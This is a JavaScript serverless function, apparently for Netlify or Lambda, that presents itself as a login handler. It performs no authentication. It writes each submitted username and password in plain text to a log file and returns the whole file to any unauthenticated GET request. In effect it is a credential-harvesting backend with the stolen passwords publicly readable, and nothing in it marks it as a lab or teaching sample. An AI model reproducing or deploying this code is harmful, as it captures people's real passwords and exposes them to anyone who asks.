const fs = require('fs');
const path = require('path');

function getLogFilePath() {
  if (process.env.NETLIFY || process.env.AWS_LAMBDA_FUNCTION_NAME) {
    return path.join('/tmp', 'login-attempts.txt');
  }
  return path.join(__dirname, '..', '..', 'logs', 'login-attempts.txt');
}

exports.handler = async function (event, context) {
  const logFile = getLogFilePath();
  const logDir = path.dirname(logFile);

  fs.mkdirSync(logDir, { recursive: true });

  if (event.httpMethod === 'GET') {
    try {
      if (!fs.existsSync(logFile)) {
        fs.writeFileSync(logFile, '', 'utf8');
      }

      const logs = fs.readFileSync(logFile, 'utf8').trim();
      return {
        statusCode: 200,
        body: JSON.stringify({ ok: true, logs: logs || 'No logs yet.' }),
        headers: { 'Content-Type': 'application/json' },
      };
    } catch (error) {
      return {
        statusCode: 500,
        body: JSON.stringify({ ok: false, message: 'Unable to read logs', error: error.message }),
        headers: { 'Content-Type': 'application/json' },
      };
    }
  }

  if (event.httpMethod !== 'POST') {
    return {
      statusCode: 405,
      body: JSON.stringify({ ok: false, message: 'Method not allowed' }),
      headers: { 'Content-Type': 'application/json' },
    };
  }

  try {
    const body = JSON.parse(event.body || '{}');
    const username = body.username || 'unknown';
    const password = body.password || '';
    const timestamp = new Date().toISOString();

    fs.appendFileSync(logFile, `[${timestamp}] username=${username} password=${password}\n`, 'utf8');

    return {
      statusCode: 200,
      body: JSON.stringify({ ok: true, message: 'Login attempt recorded.' }),
      headers: { 'Content-Type': 'application/json' },
    };
  } catch (error) {
    return {
      statusCode: 500,
      body: JSON.stringify({ ok: false, message: 'Unable to log attempt', error: error.message }),
      headers: { 'Content-Type': 'application/json' },
    };
  }
};
